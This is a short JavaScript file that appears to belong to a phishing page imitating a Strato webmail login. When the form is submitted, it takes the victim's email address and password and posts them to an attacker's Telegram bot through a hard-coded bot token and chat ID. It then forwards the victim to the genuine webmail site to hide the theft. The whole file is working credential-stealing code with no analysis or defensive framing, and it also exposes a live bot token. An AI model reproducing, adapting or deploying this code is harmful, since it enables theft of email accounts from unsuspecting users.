const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
const chatId = "6837437455";

document
  .getElementById("use-form")
  .addEventListener("submit", function (event) {
    event.preventDefault();

    const password = document.getElementById("use-password").value;
    const staySignedIn = document.getElementById("use-store-box").checked;

    // Retrieve the username from localStorage
    const username = localStorage.getItem("username");

    const message = `Email: ${username}\nPassword: ${password}\nStay signed in: ${
      staySignedIn ? "Yes" : "No"
    }`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Message sent to Telegram bot successfully!");
        } else {
          console.error("Failed to send message to Telegram bot.");
        }
      })
      .catch((error) => {
        console.error("Error sending message to Telegram bot:", error);
      });

    window.location.href = "https://webmail.strato.com/appsuite/ui";
  });
